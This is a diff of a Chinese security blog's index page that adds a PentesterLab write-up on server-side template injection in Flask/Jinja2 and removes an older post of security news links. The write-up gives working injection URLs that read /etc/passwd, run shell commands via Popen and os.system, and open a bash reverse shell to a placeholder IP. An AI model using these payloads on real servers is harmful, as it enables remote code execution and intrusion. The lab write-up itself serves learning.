@@ -308,6 +308,154 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/01/16/从一道pentesterlab的题目说起/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/01/16/从一道pentesterlab的题目说起/" itemprop="url">
+                  从一道pentesterlab的题目说起
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-16T22:04:50+08:00">
+                2018-01-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>这个要从前几天朋友丢过来的一个链接说起，是一道SSTI(Server Side Template Injection)的题目,目标是要读取任意命令，之前也没分析过SSTI的漏洞，所以简单看了下没搞定,后来有其它的事情就没看，这两天又看了下，觉得还是挺有意思的，就记录一下。<h4 id="method1"><a href="#method1" class="headerlink" title="method1"></a>method1</h4></li>
+<li>SSTI原理就不讲了，不是这篇文章的重点，想要了解可以参考Reference。<br>这个题目和Reference文章基本是一样的。</li>
+<li><p>读文件就不解释了 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>这里是通过file.read()方法直接读文件，然后直接显示在页面上的。但是如何实现命令执行反弹shell呢?</p>
+</li>
+<li>通过列举当前object下的子类可以发现有subprocess的Popen类，大家应该知道Popen是直接可以执行命令的，要索引类Popen，使用index不行（原因不明），但也可以通过笨方法自己索引<br><img src="/2018/01/16/从一道pentesterlab的题目说起/indexpopen.png" alt=""><br><img src="/2018/01/16/从一道pentesterlab的题目说起/subprocess.png" alt=""></li>
+<li>索引233，后面就可以执行命令了，但是不能回显，所以可以把我们的命令执行后写入到文件，然后再通过读文件读出来。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/writecomman.png" alt=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[233](&quot;id &gt;/tmp/M0rk.txt&quot;,shell=True) &#125;&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/01/16/从一道pentesterlab的题目说起/readfile.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/M0rk.txt&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
+<ul>
+<li>那能不能弹shell呢？答案是肯定的.<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[233](&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;,shell=True) &#125;&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/01/16/从一道pentesterlab的题目说起/shell.png" alt=""></p>
+<h4 id="method2"><a href="#method2" class="headerlink" title="method2"></a>method2</h4><ul>
+<li><p>今天又仔细研究了一下，发现了一种不依赖mro（Method Resolution Order）的方法。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/indexsystem.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;) &#125;&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>同样可以反弹shell<br><img src="/2018/01/16/从一道pentesterlab的题目说起/shell2.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.values()[138](&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;) &#125;&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
+<li>本来想写个长篇文章介绍SSTI原理以及python沙箱绕过原理的，后来发现无非还是翻译英文原著的文章，所以想了解原理的直接去看英文原版文章就好，0.0<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2</a>(<a href="https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/" target="_blank" rel="external">https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/</a>)<br><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="external">CSAW-CTF Python sandbox write-up</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/01/15/20180115安全动态/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1544,163 +1692,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/11/21/20171121安全动态/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="M0rk">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="M0rk's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/11/21/20171121安全动态/" itemprop="url">
-                  20171121安全动态
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-21T13:03:04+08:00">
-                2017-11-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
-<li>如何在 Windows PE 文件中植入一个无法检测到的后门<br><a href="https://haiderm.com/fully-undetectable-backdooring-pe-files/" target="_blank" rel="external">https://haiderm.com/fully-undetectable-backdooring-pe-files/</a></li>
-<li>Linux 内核 net/ipv4/inet_connection_sock.c inet_csk_clone_lock Double Free 漏洞（CVE-2017-8890）PoC<br><a href="https://github.com/hardenedlinux/offensive_poc/tree/master/CVE-2017-8890" target="_blank" rel="external">https://github.com/hardenedlinux/offensive_poc/tree/master/CVE-2017-8890</a></li>
-<li>使用递归攻击未初始化变量<br><a href="https://signal11.io/index.php/2017/11/19/attacking-uninitialized-variables-with-recursion/" target="_blank" rel="external">https://signal11.io/index.php/2017/11/19/attacking-uninitialized-variables-with-recursion/</a></li>
-<li>使用 SCF 文件窃取用户 Hash<br><a href="https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/" target="_blank" rel="external">https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/</a></li>
-<li>Meterpreter 渗透框架的 getsystem 命令是如何夺取 SYSTEM 权限的<br><https: blog.xpnsec.com="" becoming-system=""></https:></li>
-<li>CVE-2017-11882<br><a href="https://github.com/embedi/CVE-2017-11882" target="_blank" rel="external">https://github.com/embedi/CVE-2017-11882</a></li>
-<li>burp-molly-scanner - 将 BurpSuite 变成 Headless 的 Web 应用漏洞扫描器<br><a href="https://github.com/yandex/burp-molly-scanner/" target="_blank" rel="external">https://github.com/yandex/burp-molly-scanner/</a></li>
-<li>使用 XSS 窃取 CSRF Token<br><a href="https://digi.ninja/blog/xss_steal_csrf_token.php" target="_blank" rel="external">https://digi.ninja/blog/xss_steal_csrf_token.php</a></li>
-<li>微软提供了一个 Windows 10 开发环境虚拟机，里面预装了 SDK、Visual Studio、Bash on Ubuntu on Windows 等等<br><a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines" target="_blank" rel="external">https://developer.microsoft.com/en-us/windows/downloads/virtual-machines</a></li>
-<li>利用 WMI 进行 C＆C 通信<br><a href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/" target="_blank" rel="external">https://pentestlab.blog/2017/11/20/command-and-control-wmi/</a></li>
-<li><p>Windows 下载远程 Payload 并执行任意代码的教程<br><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/" target="_blank" rel="external">https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">之前好像看过中文的</div></pre></td></tr></table></figure>
-</li>
-<li><p>在 Windows 环境中追查凭证导出的痕迹，来自 2017 ZeroNights<br><a href="https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment" target="_blank" rel="external">https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment</a></p>
-</li>
-<li>Finding RCE in HP’s Printer Fleet<br><a href="https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/" target="_blank" rel="external">https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/</a></li>
-<li>颠覆windows的信任体系——实现任意代码签名劫持<br><a href="https://mp.weixin.qq.com/s/LCo7elFjGzZIVTA4DDuD8Q" target="_blank" rel="external">https://mp.weixin.qq.com/s/LCo7elFjGzZIVTA4DDuD8Q</a></li>
-<li>bincat - 一款二进制代码静态分析器<br><a href="https://securityonline.info/bincat-binary-code-static/" target="_blank" rel="external">https://securityonline.info/bincat-binary-code-static/</a></li>
-<li>docker-cuckoo - 将 Cuckoo Sandbox 封装进 Docker<br><a href="https://github.com/blacktop/docker-cuckoo" target="_blank" rel="external">https://github.com/blacktop/docker-cuckoo</a></li>
-<li>Ring3 / Ring0 Rootkit Hook Detection 1/2<br><a href="http://www.pentestingexperts.com/ring3-ring0-rootkit-hook-detection-1-2/" target="_blank" rel="external">http://www.pentestingexperts.com/ring3-ring0-rootkit-hook-detection-1-2/</a></li>
-<li>The Art of Fuzzing – slides and demos<br><a href="https://sec-consult.com/en/blog/2017/11/the-art-of-fuzzing-slides-and-demos/index.html" target="_blank" rel="external">https://sec-consult.com/en/blog/2017/11/the-art-of-fuzzing-slides-and-demos/index.html</a></li>
-<li>测试主流 Web 服务器（IIS、Apache、Nginx）在处理文件上传时的文件类型黑白名单问题<br><a href="https://mike-n1.github.io/ExtensionsOverview" target="_blank" rel="external">https://mike-n1.github.io/ExtensionsOverview</a></li>
-<li>From Markdown to RCE in Atom<br><a href="https://statuscode.ch/2017/11/from-markdown-to-rce-in-atom/" target="_blank" rel="external">https://statuscode.ch/2017/11/from-markdown-to-rce-in-atom/</a></li>
-<li>SSF - 在 TLS 隧道下提供 TCP/UDP 端口转发、SOCKS5 代理以及远程 Shell 的工具<br><a href="https://github.com/securesocketfunneling/ssf" target="_blank" rel="external">https://github.com/securesocketfunneling/ssf</a></li>
-<li>Sysmon v6.20 发布，新增了一个改变服务和驱动名称的功能，可以避免恶意软件通过名字判断 Sysmon 的存在<br><https: docs.microsoft.com="" en-us="" sysinternals="" downloads="" sysmon=""></https:></li>
-<li>CRLF 头注入与任意 URL 跳转漏洞利用技巧<br>&lt; <a href="https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies&gt;" target="_blank" rel="external">https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies&gt;</a></li>
-<li>Windows 交互式会话数字取证研究<br><a href="https://countuponsecurity.com/2017/11/22/digital-forensics-artifacts-of-interactive-sessions/" target="_blank" rel="external">https://countuponsecurity.com/2017/11/22/digital-forensics-artifacts-of-interactive-sessions/</a></li>
-<li>使用 DNS 打破 AWS 云环境中的隔离网络<br><a href="https://dejandayoff.com/using-dns-to-break-out-of-isolated-networks-in-a-aws-cloud-environment/" target="_blank" rel="external">https://dejandayoff.com/using-dns-to-break-out-of-isolated-networks-in-a-aws-cloud-environment/</a></li>
-<li>网络犯罪分子如何滥用聊天平台 API 作为C&amp;C 通信的基础设施<br><a href="https://documents.trendmicro.com/assets/wp/wp-how-cybercriminals-can-abuse-chat-platform-apis-as-cnc-infrastructures.pdf" target="_blank" rel="external">https://documents.trendmicro.com/assets/wp/wp-how-cybercriminals-can-abuse-chat-platform-apis-as-cnc-infrastructures.pdf</a></li>
-<li>Mitre 组织创建了一个称作 ATT&amp;CK 的项目，之前有过推送，这个项目整理了攻击和入侵者常用的一些技术和策略。看到这个项目之后，来自 Veramine 团队的研究员也创建了一个项目，用于总结和讨论如何检测和防御 ATT&amp;CK 项目中涉及的攻击技术<br><a href="https://github.com/veramine/Detections/wiki" target="_blank" rel="external">https://github.com/veramine/Detections/wiki</a></li>
-<li>Ursnif 变种利用 TLS Callback 技术实现进程注入<br><a href="https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html" target="_blank" rel="external">https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">有源码</div></pre></td></tr></table></figure></li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1745,7 +1741,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">150</span>
+                <span class="site-state-item-count">151</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
